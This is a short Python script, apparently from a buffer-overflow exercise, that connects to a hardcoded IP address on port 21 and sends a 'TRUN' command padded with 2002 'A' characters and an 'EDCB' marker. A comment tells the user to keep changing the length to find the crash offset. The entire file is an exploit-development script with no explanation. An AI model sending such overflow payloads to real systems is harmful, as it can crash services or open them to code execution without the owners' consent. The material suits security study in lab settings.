import socket;

ip = "129.21.144.64";
port = 21;

length = 2002           #keep changing this!

try:
    badstr = "A"*length + "EDCB"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.settimeout(5)
    banner = sock.recv(2048)
    print("BANNER: " + banner.decode('utf-8'))
    sendstr = "TRUN " + badstr + "\r\n"
    sock.send(sendstr.encode('utf-8'))
    print("RESPONSE: ")
    print(sock.recv(2048))
except Exception as e:
    print(e)
